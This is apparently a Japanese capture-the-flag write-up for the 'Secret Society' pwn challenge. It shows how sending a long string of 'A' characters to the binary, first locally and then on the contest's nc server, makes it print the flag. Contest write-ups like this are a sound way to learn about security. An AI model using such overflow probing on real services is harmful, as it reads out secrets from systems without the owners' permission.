# Secret Society:Pwn:435pts
Wanna enter the Secret Society? Well you have to find the secret code first!  
nc chall.csivit.com 30041  
[secret-society](secret-society)  

# Solution
secret-societyが渡される。  
とりあえず実行するとncとの違いが見られた。  
```bash
$ ls
secret-society
$ ./secret-society
What is the secret phrase?
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
You are a double agent, it's game over for you.
$ nc chall.csivit.com 30041
What is the secret phrase?
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Shhh... don't tell anyone else about AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA, we are everywhere.
```
flag.txtを作ってみると同じ動きをするようだ。  
これはstringsの結果にflag.txtが存在することから予想した。  
```bash
$ echo "Test{Foooooooooooooooooooo}" > flag.txt
$ ls
flag.txt  secret-society
$ ./secret-society
What is the secret phrase?
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Shhh... don't tell anyone else about AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA, we are everywhere.
```
適当にAを入力するとflag.txtが見られたため、ncでも同様に行う。  
```bash
$ ./secret-society
What is the secret phrase?
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Shhh... don't tell anyone else about AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,Test{Foooooooooooooooooooo}
$ nc chall.csivit.com 30041
What is the secret phrase?
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Shhh... don't tell anyone else about AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,csivit{Bu!!er_e3pl01ts_ar5_5asy}
```
flagが得られた。  
理由は不明だが、形式が違う。  

## csivit{Bu!!er_e3pl01ts_ar5_5asy}